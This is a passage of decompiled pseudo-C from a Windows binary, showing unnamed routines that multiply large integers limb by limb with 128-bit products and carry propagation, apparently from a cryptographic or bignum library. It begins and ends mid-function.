  v39 = v36 + v34 + *((_QWORD *)&v37 + 1);
  v40 = v39 < *((_QWORD *)&v37 + 1);
  v41 = v10 * (unsigned __int128)v4;
  v42 = v38 + v41;
  *((_QWORD *)&v41 + 1) += v38 + (unsigned __int64)v41 < v38;
  v43 = *((_QWORD *)&v41 + 1) + v39;
  v44 = (v43 < *((_QWORD *)&v41 + 1)) + v40;
  v45 = v6 * (unsigned __int128)v5;
  *(_QWORD *)&v45 = v42 + v45;
  *v57 = v45;
  *((_QWORD *)&v45 + 1) += (unsigned __int64)v45 < v42;
  v46 = *((_QWORD *)&v45 + 1) + v43;
  v47 = (v46 < *((_QWORD *)&v45 + 1)) + v44;
  v48 = v58[2] * (unsigned __int128)v59[3];
  v49 = v46 + v48;
  *((_QWORD *)&v48 + 1) += v46 + (unsigned __int64)v48 < v46;
  v50 = *((_QWORD *)&v48 + 1) + v47;
  v51 = v50 < *((_QWORD *)&v48 + 1);
  v52 = v58[3] * (unsigned __int128)v59[2];
  *(_QWORD *)&v52 = v49 + v52;
  v57[1] = v52;
  *((_QWORD *)&v52 + 1) += (unsigned __int64)v52 < v49;
  v53 = *((_QWORD *)&v52 + 1) + v50;
  v54 = (v53 < *((_QWORD *)&v52 + 1)) + v51;
  v55 = v58[3] * (unsigned __int128)v59[3];
  result = v53 + v55;
  v57[2] = result;
  v57[3] = v54 + (result < v53) + *((_QWORD *)&v55 + 1);
  return result;
}

//----- (00000001400435B0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400435B0(_QWORD *a1, unsigned __int64 *a2, unsigned __int64 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r10
  unsigned __int64 *v5; // rdi
  unsigned __int64 v6; // rbp
  unsigned __int64 v7; // r14
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // r13
  unsigned __int64 *v10; // rbx
  unsigned __int64 v11; // r8
  unsigned __int64 v12; // r15
  unsigned __int64 v13; // r9
  __int64 v14; // r11
  unsigned __int64 v15; // rdx
  unsigned __int64 v16; // r11
  _BOOL8 v17; // rsi
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // r11
  _BOOL8 v20; // rsi
  unsigned __int64 v21; // rdx
  unsigned __int64 v22; // r11
  _BOOL8 v23; // rsi
  unsigned __int64 v24; // rdx
  unsigned __int64 v25; // rax
  unsigned __int64 v26; // rbx
  unsigned __int64 v27; // r11
  _BOOL8 v28; // rsi
  unsigned __int64 v29; // rdx
  unsigned __int64 v30; // r11
  __int64 v31; // rsi
  unsigned __int64 v32; // rdx
  unsigned __int64 v33; // r11
  __int64 v34; // rsi
  unsigned __int128 v35; // ax
  unsigned __int64 v36; // rcx
  unsigned __int64 v37; // rsi
  _BOOL8 v38; // r11
  unsigned __int128 v39; // ax
  unsigned __int64 v40; // r8
  unsigned __int64 v41; // rsi
  _BOOL8 v42; // r11
  unsigned __int128 v43; // ax
  unsigned __int64 v44; // rcx
  unsigned __int64 v45; // rsi
  _BOOL8 v46; // r11
  unsigned __int128 v47; // ax
  unsigned __int64 v48; // r8
  unsigned __int64 v49; // rsi
  _BOOL8 v50; // r11
  unsigned __int128 v51; // ax
  unsigned __int64 v52; // rcx
  unsigned __int64 v53; // rsi
  __int64 v54; // r11
  unsigned __int128 v55; // ax
  unsigned __int64 v56; // r8
  unsigned __int64 v57; // rsi
  __int64 v58; // r11
  unsigned __int128 v59; // ax
  unsigned __int64 v60; // r10
  unsigned __int64 v61; // r9
  unsigned __int64 v62; // rsi
  __int64 v63; // r11
  unsigned __int128 v64; // ax
  unsigned __int64 v65; // rsi
  __int64 v66; // r11
  unsigned __int64 v67; // rsi
  __int64 v68; // r11
  unsigned __int128 v69; // ax
  unsigned __int64 v70; // rcx
  __int64 v71; // r9
  _BOOL8 v72; // r11
  unsigned __int128 v73; // ax
  unsigned __int64 v74; // r8
  unsigned __int64 v75; // r9
  _BOOL8 v76; // r11
  unsigned __int128 v77; // ax
  unsigned __int64 v78; // rcx
  unsigned __int64 v79; // r9
  _BOOL8 v80; // r11
  unsigned __int128 v81; // ax
  unsigned __int64 v82; // r8
  unsigned __int64 v83; // r9
  _BOOL8 v84; // r11
  unsigned __int128 v85; // ax
  unsigned __int64 v86; // rcx
  unsigned __int64 v87; // r9
  __int64 v88; // r11
  unsigned __int128 v89; // ax
  unsigned __int64 v90; // r8
  unsigned __int64 v91; // r9
  __int64 v92; // r11
  unsigned __int128 v93; // ax
  unsigned __int64 v94; // r9
  __int64 v95; // r11
  unsigned __int128 v96; // ax
  unsigned __int64 v97; // rcx
  unsigned __int64 v98; // r11
  _BOOL8 v99; // r10
  unsigned __int128 v100; // ax
  unsigned __int64 v101; // r8
  unsigned __int64 v102; // r11
  _BOOL8 v103; // r10
  unsigned __int128 v104; // ax
  unsigned __int64 v105; // rcx
  unsigned __int64 v106; // r11
  _BOOL8 v107; // r10
  unsigned __int128 v108; // ax
  unsigned __int64 v109; // r8
  unsigned __int64 v110; // r11
  _BOOL8 v111; // r10
  unsigned __int128 v112; // ax
  unsigned __int64 v113; // rcx
  unsigned __int64 v114; // r11
  __int64 v115; // r10
  unsigned __int128 v116; // ax
  unsigned __int64 v117; // r11
  __int64 v118; // r10
  unsigned __int128 v119; // ax
  unsigned __int64 v120; // rcx
  unsigned __int64 v121; // r10
  _BOOL8 v122; // r9
  unsigned __int128 v123; // ax
  unsigned __int64 v124; // r8
  unsigned __int64 v125; // r10
  _BOOL8 v126; // r9
  unsigned __int128 v127; // ax
  unsigned __int64 v128; // rcx
  unsigned __int64 v129; // r10
  _BOOL8 v130; // r9
  unsigned __int128 v131; // ax
  unsigned __int64 v132; // r8
  unsigned __int64 v133; // r10
  _BOOL8 v134; // r9
  unsigned __int128 v135; // ax
  unsigned __int64 v136; // r10
  __int64 v137; // r9
  unsigned __int128 v138; // ax
  unsigned __int64 v139; // rcx
  unsigned __int64 v140; // r9
  _BOOL8 v141; // r10
  unsigned __int128 v142; // ax
  unsigned __int64 v143; // r8
  unsigned __int64 v144; // r9
  _BOOL8 v145; // r10
  unsigned __int128 v146; // ax
  unsigned __int64 v147; // rcx
  unsigned __int64 v148; // r9
  _BOOL8 v149; // r10
  unsigned __int128 v150; // ax
  unsigned __int64 v151; // r9
  _BOOL8 v152; // r10
  unsigned __int128 v153; // ax
  unsigned __int64 v154; // rcx
  unsigned __int64 v155; // r10
  _BOOL8 v156; // r9
  unsigned __int128 v157; // ax
  unsigned __int64 v158; // r8
  unsigned __int64 v159; // r10
  _BOOL8 v160; // r9
  unsigned __int128 v161; // ax
  unsigned __int64 v162; // r10
  _BOOL8 v163; // r9
  unsigned __int128 v164; // ax
  unsigned __int64 v165; // rcx
  unsigned __int64 v166; // r9
  _BOOL8 v167; // rbx
  unsigned __int128 v168; // ax
  unsigned __int64 v169; // r9
  _BOOL8 v170; // rbx
  unsigned __int128 v171; // ax
  unsigned __int64 result; // rax
  _QWORD *v173; // [rsp+40h] [rbp+8h]
  unsigned __int64 *v174; // [rsp+48h] [rbp+10h]
  unsigned __int64 *v175; // [rsp+50h] [rbp+18h]

  v175 = a3;
  v174 = a2;
  v173 = a1;
  v4 = *a2;
  v5 = a2;
  v6 = a2[1];
  v7 = a2[2];
  v8 = a2[3];
  v9 = a2[4];
  v10 = a3;
  v11 = a3[6];
  v12 = a4;
  v13 = a2[5];
  v14 = *a2 * (unsigned __int128)v11 >> 64;
  v15 = v6 * (unsigned __int128)v10[5] >> 64;
  v16 = v15 + v14;
  v17 = v16 < v15;
  v18 = v7 * (unsigned __int128)v10[4] >> 64;
  v19 = v18 + v16;
  v20 = (v19 < v18) + v17;
  v21 = v8 * (unsigned __int128)v10[3] >> 64;
  v22 = v21 + v19;
  v23 = (v22 < v21) + v20;
  v24 = v9 * (unsigned __int128)v10[2] >> 64;
  v25 = v10[1];
  v26 = *v10;
  v27 = v24 + v22;
  v28 = (v27 < v24) + v23;
  v29 = v13 * (unsigned __int128)v25 >> 64;
  v30 = v29 + v27;
  v31 = (v30 < v29) + v28;
  v32 = v5[6] * (unsigned __int128)v26 >> 64;
  v33 = v32 + v30;
  v34 = (v33 < v32) + v31;
  v35 = v4 * (unsigned __int128)v175[7];
  v36 = v33 + v35;
  *((_QWORD *)&v35 + 1) += v33 + (unsigned __int64)v35 < v33;
  v37 = *((_QWORD *)&v35 + 1) + v34;
  v38 = v37 < *((_QWORD *)&v35 + 1);
  v39 = v6 * (unsigned __int128)v11;
  v40 = v36 + v39;
  *((_QWORD *)&v39 + 1) += v36 + (unsigned __int64)v39 < v36;
  v41 = *((_QWORD *)&v39 + 1) + v37;
  v42 = (v41 < *((_QWORD *)&v39 + 1)) + v38;
  v43 = v7 * (unsigned __int128)v175[5];
  v44 = v40 + v43;
  *((_QWORD *)&v43 + 1) += v40 + (unsigned __int64)v43 < v40;
  v45 = *((_QWORD *)&v43 + 1) + v41;
  v46 = (v45 < *((_QWORD *)&v43 + 1)) + v42;
  v47 = v8 * (unsigned __int128)v175[4];
  v48 = v44 + v47;
  *((_QWORD *)&v47 + 1) += v44 + (unsigned __int64)v47 < v44;
  v49 = *((_QWORD *)&v47 + 1) + v45;
  v50 = (v49 < *((_QWORD *)&v47 + 1)) + v46;
  v51 = v9 * (unsigned __int128)v175[3];
  v52 = v48 + v51;
  *((_QWORD *)&v51 + 1) += v48 + (unsigned __int64)v51 < v48;
  v53 = *((_QWORD *)&v51 + 1) + v49;
  v54 = (v53 < *((_QWORD *)&v51 + 1)) + v50;
  v55 = v13 * (unsigned __int128)v175[2];
  v56 = v52 + v55;
  *((_QWORD *)&v55 + 1) += v52 + (unsigned __int64)v55 < v52;
  v57 = *((_QWORD *)&v55 + 1) + v53;
  v58 = (v57 < *((_QWORD *)&v55 + 1)) + v54;
  v59 = v174[6] * (unsigned __int128)v175[1];
  v60 = v174[7];
  v61 = v56 + v59;
  *((_QWORD *)&v59 + 1) += v56 + (unsigned __int64)v59 < v56;
  v62 = *((_QWORD *)&v59 + 1) + v57;
  v63 = (v62 < *((_QWORD *)&v59 + 1)) + v58;
  v64 = v60 * (unsigned __int128)v26;
  *((_QWORD *)&v64 + 1) += v61 + (unsigned __int64)v64 < v61;
  v65 = *((_QWORD *)&v64 + 1) + v62;
  v66 = (v65 < *((_QWORD *)&v64 + 1)) + v63;
  v67 = (v12 < v61 + (unsigned __int64)v64) + v65;
  v68 = (__PAIR__(v67, v12) < v61 + (unsigned __int64)v64) + v66;
  v69 = v6 * (unsigned __int128)v175[7];
  v70 = v67 + v69;
  *((_QWORD *)&v69 + 1) += v67 + (unsigned __int64)v69 < v67;
  v71 = v68 + *((_QWORD *)&v69 + 1);
  v72 = (unsigned __int64)(v68 + *((_QWORD *)&v69 + 1)) < *((_QWORD *)&v69 + 1);
  v73 = v7 * (unsigned __int128)v175[6];
  v74 = v70 + v73;
  *((_QWORD *)&v73 + 1) += v70 + (unsigned __int64)v73 < v70;
  v75 = *((_QWORD *)&v73 + 1) + v71;
  v76 = (v75 < *((_QWORD *)&v73 + 1)) + v72;
  v77 = v8 * (unsigned __int128)v175[5];
  v78 = v74 + v77;
  *((_QWORD *)&v77 + 1) += v74 + (unsigned __int64)v77 < v74;
  v79 = *((_QWORD *)&v77 + 1) + v75;
  v80 = (v79 < *((_QWORD *)&v77 + 1)) + v76;
  v81 = v9 * (unsigned __int128)v175[4];
  v82 = v78 + v81;
  *((_QWORD *)&v81 + 1) += v78 + (unsigned __int64)v81 < v78;
  v83 = *((_QWORD *)&v81 + 1) + v79;
  v84 = (v83 < *((_QWORD *)&v81 + 1)) + v80;
  v85 = v174[5] * (unsigned __int128)v175[3];
  v86 = v82 + v85;
  *((_QWORD *)&v85 + 1) += v82 + (unsigned __int64)v85 < v82;
  v87 = *((_QWORD *)&v85 + 1) + v83;
  v88 = (v87 < *((_QWORD *)&v85 + 1)) + v84;
  v89 = v174[6] * (unsigned __int128)v175[2];
  v90 = v86 + v89;
  *((_QWORD *)&v89 + 1) += v86 + (unsigned __int64)v89 < v86;
  v91 = *((_QWORD *)&v89 + 1) + v87;
  v92 = (v91 < *((_QWORD *)&v89 + 1)) + v88;
  v93 = v60 * (unsigned __int128)v175[1];
  *(_QWORD *)&v93 = v90 + v93;
  *v173 = v93;
  *((_QWORD *)&v93 + 1) += (unsigned __int64)v93 < v90;
  v94 = *((_QWORD *)&v93 + 1) + v91;
  v95 = (v94 < *((_QWORD *)&v93 + 1)) + v92;
  v96 = v174[2] * (unsigned __int128)v175[7];
  v97 = v94 + v96;
  *((_QWORD *)&v96 + 1) += v94 + (unsigned __int64)v96 < v94;
  v98 = *((_QWORD *)&v96 + 1) + v95;
  v99 = v98 < *((_QWORD *)&v96 + 1);
  v100 = v174[3] * (unsigned __int128)v175[6];
  v101 = v97 + v100;
  *((_QWORD *)&v100 + 1) += v97 + (unsigned __int64)v100 < v97;
  v102 = *((_QWORD *)&v100 + 1) + v98;
  v103 = (v102 < *((_QWORD *)&v100 + 1)) + v99;
  v104 = v174[4] * (unsigned __int128)v175[5];
  v105 = v101 + v104;
  *((_QWORD *)&v104 + 1) += v101 + (unsigned __int64)v104 < v101;
  v106 = *((_QWORD *)&v104 + 1) + v102;
  v107 = (v106 < *((_QWORD *)&v104 + 1)) + v103;
  v108 = v174[5] * (unsigned __int128)v175[4];
  v109 = v105 + v108;
  *((_QWORD *)&v108 + 1) += v105 + (unsigned __int64)v108 < v105;
  v110 = *((_QWORD *)&v108 + 1) + v106;
  v111 = (v110 < *((_QWORD *)&v108 + 1)) + v107;
  v112 = v174[6] * (unsigned __int128)v175[3];
  v113 = v109 + v112;
  *((_QWORD *)&v112 + 1) += v109 + (unsigned __int64)v112 < v109;
  v114 = *((_QWORD *)&v112 + 1) + v110;
  v115 = (v114 < *((_QWORD *)&v112 + 1)) + v111;
  v116 = v174[7] * (unsigned __int128)v175[2];
  *(_QWORD *)&v116 = v113 + v116;
  v173[1] = v116;
  *((_QWORD *)&v116 + 1) += (unsigned __int64)v116 < v113;
  v117 = *((_QWORD *)&v116 + 1) + v114;
  v118 = (v117 < *((_QWORD *)&v116 + 1)) + v115;
  v119 = v174[3] * (unsigned __int128)v175[7];
  v120 = v117 + v119;
  *((_QWORD *)&v119 + 1) += v117 + (unsigned __int64)v119 < v117;
  v121 = *((_QWORD *)&v119 + 1) + v118;
  v122 = v121 < *((_QWORD *)&v119 + 1);
  v123 = v174[4] * (unsigned __int128)v175[6];
  v124 = v120 + v123;
  *((_QWORD *)&v123 + 1) += v120 + (unsigned __int64)v123 < v120;
  v125 = *((_QWORD *)&v123 + 1) + v121;
  v126 = (v125 < *((_QWORD *)&v123 + 1)) + v122;
  v127 = v174[5] * (unsigned __int128)v175[5];
  v128 = v124 + v127;
  *((_QWORD *)&v127 + 1) += v124 + (unsigned __int64)v127 < v124;
  v129 = *((_QWORD *)&v127 + 1) + v125;
  v130 = (v129 < *((_QWORD *)&v127 + 1)) + v126;
  v131 = v174[6] * (unsigned __int128)v175[4];
  v132 = v128 + v131;
  *((_QWORD *)&v131 + 1) += v128 + (unsigned __int64)v131 < v128;
  v133 = *((_QWORD *)&v131 + 1) + v129;
  v134 = (v133 < *((_QWORD *)&v131 + 1)) + v130;
  v135 = v174[7] * (unsigned __int128)v175[3];
  *(_QWORD *)&v135 = v132 + v135;
  v173[2] = v135;
  *((_QWORD *)&v135 + 1) += (unsigned __int64)v135 < v132;
  v136 = *((_QWORD *)&v135 + 1) + v133;
  v137 = (v136 < *((_QWORD *)&v135 + 1)) + v134;
  v138 = v174[4] * (unsigned __int128)v175[7];
  v139 = v136 + v138;
  *((_QWORD *)&v138 + 1) += v136 + (unsigned __int64)v138 < v136;
  v140 = *((_QWORD *)&v138 + 1) + v137;
  v141 = v140 < *((_QWORD *)&v138 + 1);
  v142 = v174[5] * (unsigned __int128)v175[6];
  v143 = v139 + v142;
  *((_QWORD *)&v142 + 1) += v139 + (unsigned __int64)v142 < v139;
  v144 = *((_QWORD *)&v142 + 1) + v140;
  v145 = (v144 < *((_QWORD *)&v142 + 1)) + v141;
  v146 = v174[6] * (unsigned __int128)v175[5];
  v147 = v143 + v146;
  *((_QWORD *)&v146 + 1) += v143 + (unsigned __int64)v146 < v143;
  v148 = *((_QWORD *)&v146 + 1) + v144;
  v149 = (v148 < *((_QWORD *)&v146 + 1)) + v145;
  v150 = v174[7] * (unsigned __int128)v175[4];
  *(_QWORD *)&v150 = v147 + v150;
  v173[3] = v150;
  *((_QWORD *)&v150 + 1) += (unsigned __int64)v150 < v147;
  v151 = *((_QWORD *)&v150 + 1) + v148;
  v152 = (v151 < *((_QWORD *)&v150 + 1)) + v149;
  v153 = v174[5] * (unsigned __int128)v175[7];
  v154 = v151 + v153;
  *((_QWORD *)&v153 + 1) += v151 + (unsigned __int64)v153 < v151;
  v155 = *((_QWORD *)&v153 + 1) + v152;
  v156 = v155 < *((_QWORD *)&v153 + 1);
  v157 = v174[6] * (unsigned __int128)v175[6];
  v158 = v154 + v157;
  *((_QWORD *)&v157 + 1) += v154 + (unsigned __int64)v157 < v154;
  v159 = *((_QWORD *)&v157 + 1) + v155;
  v160 = (v159 < *((_QWORD *)&v157 + 1)) + v156;
  v161 = v174[7] * (unsigned __int128)v175[5];
  *(_QWORD *)&v161 = v158 + v161;
  v173[4] = v161;
  *((_QWORD *)&v161 + 1) += (unsigned __int64)v161 < v158;
  v162 = *((_QWORD *)&v161 + 1) + v159;
  v163 = (v162 < *((_QWORD *)&v161 + 1)) + v160;
  v164 = v174[6] * (unsigned __int128)v175[7];
  v165 = v162 + v164;
  *((_QWORD *)&v164 + 1) += v162 + (unsigned __int64)v164 < v162;
  v166 = *((_QWORD *)&v164 + 1) + v163;
  v167 = v166 < *((_QWORD *)&v164 + 1);
  v168 = v174[7] * (unsigned __int128)v175[6];
  *(_QWORD *)&v168 = v165 + v168;
  v173[5] = v168;
  *((_QWORD *)&v168 + 1) += (unsigned __int64)v168 < v165;
  v169 = *((_QWORD *)&v168 + 1) + v166;
  v170 = (v169 < *((_QWORD *)&v168 + 1)) + v167;
  v171 = v174[7] * (unsigned __int128)v175[7];
  result = v169 + v171;
  v173[6] = result;
  v173[7] = v170 + (result < v169) + *((_QWORD *)&v171 + 1);
  return result;
}

//----- (0000000140043AB0) ----------------------------------------------------
unsigned __int64 __fastcall sub_140043AB0(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int64 *v2; // r14
  _QWORD *v3; // r15
  unsigned __int128 v4; // ax
  __int64 v5; // r8
  unsigned __int64 v6; // rt0
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // r10
  unsigned __int64 v9; // rbx
  __int64 v10; // rdi
  signed __int128 v11; // t0
  unsigned __int128 v12; // ax
  unsigned __int64 v13; // r10
  unsigned __int64 v14; // r9
  unsigned __int64 v15; // rbx
  __int64 v16; // rdi
  unsigned __int64 v17; // rcx
  unsigned __int128 v18; // ax
  unsigned __int64 v19; // r11
  unsigned __int64 v20; // r8
  __int64 v21; // rbx
  unsigned __int64 v22; // rdi
  unsigned __int64 v23; // r10
  bool v24; // cf
  unsigned __int64 v25; // rcx
  unsigned __int128 v26; // ax
  __int64 v27; // rdi
  unsigned __int64 v28; // r8
  unsigned __int128 v29; // ax
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // r9
  unsigned __int64 v32; // rbx
  __int64 v33; // r11
  __int64 v34; // rdi
  unsigned __int64 v35; // rcx
  unsigned __int128 v36; // ax
  unsigned __int64 v37; // r8
  unsigned __int64 v38; // r9
  _BOOL8 v39; // rbx
  unsigned __int128 v40; // ax
  unsigned __int64 v41; // r11
  unsigned __int64 v42; // r9
  __int64 v43; // rbx
  unsigned __int64 v44; // rdi
  unsigned __int64 v45; // r10
  unsigned __int64 v46; // rcx
  unsigned __int128 v47; // ax
  unsigned __int64 v48; // r8
  unsigned __int64 v49; // r9
  _BOOL8 v50; // rdi
  unsigned __int128 v51; // ax
  unsigned __int64 v52; // r8
  unsigned __int64 v53; // r9
  __int64 v54; // rdi
  unsigned __int128 v55; // ax
  unsigned __int64 v56; // r10
  unsigned __int64 v57; // r9
  unsigned __int64 v58; // rbx
  __int64 v59; // r11
  __int64 v60; // rdi
  unsigned __int64 v61; // rcx
  unsigned __int128 v62; // ax
  unsigned __int64 v63; // r8
  unsigned __int64 v64; // r9
  _BOOL8 v65; // rbx
  unsigned __int128 v66; // ax
  unsigned __int64 v67; // rcx
  unsigned __int64 v68; // r9
  _BOOL8 v69; // rbx
  unsigned __int128 v70; // ax
  unsigned __int64 v71; // r11
  unsigned __int64 v72; // r9
  __int64 v73; // rbx
  unsigned __int64 v74; // rdi
  unsigned __int64 v75; // r10
  __int64 v76; // rbx
  unsigned __int64 v77; // rcx
  unsigned __int128 v78; // ax
  unsigned __int64 v79; // r8
  unsigned __int64 v80; // r9
  _BOOL8 v81; // rdi
  unsigned __int128 v82; // ax
  unsigned __int64 v83; // rcx
  unsigned __int64 v84; // r9
  _BOOL8 v85; // rdi
  unsigned __int128 v86; // ax
  unsigned __int64 v87; // r8
  unsigned __int64 v88; // r9
  __int64 v89; // rdi
  unsigned __int128 v90; // ax
  unsigned __int64 v91; // r9
  unsigned __int64 v92; // r10
  unsigned __int64 v93; // rbx
  __int64 v94; // r11
  __int64 v95; // rdi
  unsigned __int64 v96; // rcx
  unsigned __int128 v97; // ax
  unsigned __int64 v98; // r8
  unsigned __int64 v99; // r9
  _BOOL8 v100; // rbx
  unsigned __int128 v101; // ax
  unsigned __int64 v102; // rcx
  unsigned __int64 v103; // r9
  _BOOL8 v104; // rbx
  unsigned __int128 v105; // ax
  unsigned __int64 v106; // r8
  unsigned __int64 v107; // r9
  _BOOL8 v108; // rbx
  unsigned __int128 v109; // ax
  unsigned __int64 v110; // r11
  unsigned __int64 v111; // r9
  __int64 v112; // rbx
  unsigned __int64 v113; // rdi
  unsigned __int64 v114; // r10
  unsigned __int64 v115; // rcx
  unsigned __int128 v116; // ax
  unsigned __int64 v117; // r8
  unsigned __int64 v118; // r9
  _BOOL8 v119; // rdi
  unsigned __int128 v120; // ax
  unsigned __int64 v121; // rcx
  unsigned __int64 v122; // r9
  _BOOL8 v123; // rdi
  unsigned __int128 v124; // ax
  unsigned __int64 v125; // r8
  unsigned __int64 v126; // r9
  _BOOL8 v127; // rdi
  unsigned __int128 v128; // ax
  unsigned __int64 v129; // r8
  unsigned __int64 v130; // r9
  __int64 v131; // rdi
  unsigned __int128 v132; // ax
  unsigned __int64 v133; // r10
  unsigned __int64 v134; // r9
  unsigned __int64 v135; // rbx
  __int64 v136; // r11
  __int64 v137; // rdi
  unsigned __int64 v138; // rcx
  unsigned __int128 v139; // ax
  unsigned __int64 v140; // r8
  unsigned __int64 v141; // r9
  _BOOL8 v142; // rbx
  unsigned __int128 v143; // ax
  unsigned __int64 v144; // rcx
  unsigned __int64 v145; // r9
  _BOOL8 v146; // rbx
  unsigned __int128 v147; // ax
  unsigned __int64 v148; // r8
  unsigned __int64 v149; // r9
  _BOOL8 v150; // rbx
  unsigned __int128 v151; // ax
  unsigned __int64 v152; // rcx
  unsigned __int64 v153; // r9
  _BOOL8 v154; // rbx
  unsigned __int128 v155; // ax
  unsigned __int64 v156; // r11
  unsigned __int64 v157; // r9
  __int64 v158; // rbx
  unsigned __int64 v159; // rdi
  unsigned __int64 v160; // r10
  __int64 v161; // rbx
  unsigned __int64 v162; // rcx
  unsigned __int128 v163; // ax
  unsigned __int64 v164; // r8
  unsigned __int64 v165; // r9
  _BOOL8 v166; // rdi
  unsigned __int128 v167; // ax
  unsigned __int64 v168; // rcx
  unsigned __int64 v169; // r9
  _BOOL8 v170; // rdi
  unsigned __int128 v171; // ax
  unsigned __int64 v172; // r8
  unsigned __int64 v173; // r9
  _BOOL8 v174; // rdi
  unsigned __int128 v175; // ax
  unsigned __int64 v176; // rcx
  unsigned __int64 v177; // r9
  _BOOL8 v178; // rdi
  unsigned __int128 v179; // ax
  unsigned __int64 v180; // r8
  unsigned __int64 v181; // r9
  __int64 v182; // rdi
  unsigned __int128 v183; // ax
  unsigned __int64 v184; // r10
  unsigned __int64 v185; // r9
  unsigned __int64 v186; // rbx
  __int64 v187; // r11
  __int64 v188; // rdi
  unsigned __int64 v189; // rcx
  unsigned __int128 v190; // ax
  unsigned __int64 v191; // r8
  unsigned __int64 v192; // r9
  _BOOL8 v193; // rbx
  unsigned __int128 v194; // ax
  unsigned __int64 v195; // rcx
  unsigned __int64 v196; // r9
  _BOOL8 v197; // rbx
  unsigned __int128 v198; // ax
  unsigned __int64 v199; // r8
  unsigned __int64 v200; // r9
  _BOOL8 v201; // rbx
  unsigned __int128 v202; // ax
  unsigned __int64 v203; // rcx
  unsigned __int64 v204; // r9
  _BOOL8 v205; // rbx
  unsigned __int128 v206; // ax
  unsigned __int64 v207; // r8
  unsigned __int64 v208; // r9
  __int64 v209; // rbx
  unsigned __int128 v210; // ax
  unsigned __int64 v211; // r11
  unsigned __int64 v212; // r9
  __int64 v213; // rbx
  unsigned __int64 v214; // rdi
  unsigned __int64 v215; // r10
  unsigned __int64 v216; // rcx
  unsigned __int128 v217; // ax
  unsigned __int64 v218; // r8
  unsigned __int64 v219; // r9
  _BOOL8 v220; // rdi
  unsigned __int128 v221; // ax
  unsigned __int64 v222; // rcx
  unsigned __int64 v223; // r9
  _BOOL8 v224; // rdi
  unsigned __int128 v225; // ax
  unsigned __int64 v226; // r8
  unsigned __int64 v227; // r9
  _BOOL8 v228; // rdi
  unsigned __int128 v229; // ax
  unsigned __int64 v230; // rcx
  unsigned __int64 v231; // r9
  _BOOL8 v232; // rdi
  unsigned __int128 v233; // ax
  unsigned __int64 v234; // r8
  unsigned __int64 v235; // r9
  __int64 v236; // rdi
  unsigned __int128 v237; // ax
  unsigned __int64 v238; // r8
  unsigned __int64 v239; // r9
  __int64 v240; // rdi
  unsigned __int128 v241; // ax
  unsigned __int64 v242; // r10
  unsigned __int64 v243; // r9
  unsigned __int64 v244; // rbx
  __int64 v245; // r11
  __int64 v246; // rdi
  unsigned __int64 v247; // rcx
  unsigned __int128 v248; // ax
  unsigned __int64 v249; // r8
  unsigned __int64 v250; // r9
  _BOOL8 v251; // rbx
  unsigned __int128 v252; // ax
  unsigned __int64 v253; // rcx
  unsigned __int64 v254; // r9
  _BOOL8 v255; // rbx
  unsigned __int128 v256; // ax
  unsigned __int64 v257; // r8
  unsigned __int64 v258; // r9
  _BOOL8 v259; // rbx
  unsigned __int128 v260; // ax
  unsigned __int64 v261; // rcx
  unsigned __int64 v262; // r9
  _BOOL8 v263; // rbx
  unsigned __int128 v264; // ax
  unsigned __int64 v265; // r8
  unsigned __int64 v266; // r9
  __int64 v267; // rbx
  unsigned __int128 v268; // ax
  unsigned __int64 v269; // rcx
  unsigned __int64 v270; // r9
  __int64 v271; // rbx
  unsigned __int128 v272; // ax
  unsigned __int64 v273; // r11
  unsigned __int64 v274; // r9
  __int64 v275; // rbx
  unsigned __int64 v276; // rdi
  unsigned __int64 v277; // r10
  unsigned __int64 v278; // rcx
  unsigned __int128 v279; // ax
  unsigned __int64 v280; // r8
  unsigned __int64 v281; // r9
  _BOOL8 v282; // rdi
  unsigned __int128 v283; // ax
  unsigned __int64 v284; // rcx
  unsigned __int64 v285; // r9
  _BOOL8 v286; // rdi
  unsigned __int128 v287; // ax
  unsigned __int64 v288; // r8
  unsigned __int64 v289; // r9
  _BOOL8 v290; // rdi
  unsigned __int128 v291; // ax
  unsigned __int64 v292; // rcx
  unsigned __int64 v293; // r9
  _BOOL8 v294; // rdi
  unsigned __int128 v295; // ax
  unsigned __int64 v296; // r8
  unsigned __int64 v297; // r9
  __int64 v298; // rdi
  unsigned __int128 v299; // ax
  unsigned __int64 v300; // r9
  unsigned __int64 v301; // r8
  __int64 v302; // rdi
  unsigned __int128 v303; // ax
  unsigned __int64 v304; // r10
  unsigned __int64 v305; // r9
  unsigned __int64 v306; // rbx
  __int64 v307; // r11
  __int64 v308; // rdi
  unsigned __int64 v309; // rcx
  unsigned __int128 v310; // ax
  unsigned __int64 v311; // r8
  unsigned __int64 v312; // r9
  _BOOL8 v313; // rbx
  unsigned __int128 v314; // ax
  unsigned __int64 v315; // rcx
  unsigned __int64 v316; // r9
  _BOOL8 v317; // rbx
  unsigned __int128 v318; // ax
  unsigned __int64 v319; // r8
  unsigned __int64 v320; // r9
  _BOOL8 v321; // rbx
  unsigned __int128 v322; // ax
  unsigned __int64 v323; // rcx
  unsigned __int64 v324; // r9
  _BOOL8 v325; // rbx
  unsigned __int128 v326; // ax
  unsigned __int64 v327; // r8
  unsigned __int64 v328; // r9
  __int64 v329; // rbx
  unsigned __int128 v330; // ax
  unsigned __int64 v331; // r11
  unsigned __int64 v332; // r9
  __int64 v333; // rbx
  unsigned __int64 v334; // rdi
  unsigned __int64 v335; // r10
  __int64 v336; // rbx
  unsigned __int64 v337; // rcx
  unsigned __int128 v338; // ax
  unsigned __int64 v339; // r8
  unsigned __int64 v340; // r9
  _BOOL8 v341; // rdi
  unsigned __int128 v342; // ax
  unsigned __int64 v343; // rcx
  unsigned __int64 v344; // r9
  _BOOL8 v345; // rdi
  unsigned __int128 v346; // ax
  unsigned __int64 v347; // r8
  unsigned __int64 v348; // r9
  _BOOL8 v349; // rdi
  unsigned __int128 v350; // ax
  unsigned __int64 v351; // rcx
  unsigned __int64 v352; // r9
  _BOOL8 v353; // rdi
  unsigned __int128 v354; // ax
  unsigned __int64 v355; // r8
  unsigned __int64 v356; // r9
  __int64 v357; // rdi
  unsigned __int128 v358; // ax
  unsigned __int64 v359; // r10
  unsigned __int64 v360; // r9
  unsigned __int64 v361; // rbx
  __int64 v362; // r11
  __int64 v363; // rdi
  unsigned __int64 v364; // rcx
  unsigned __int128 v365; // ax
  unsigned __int64 v366; // r8
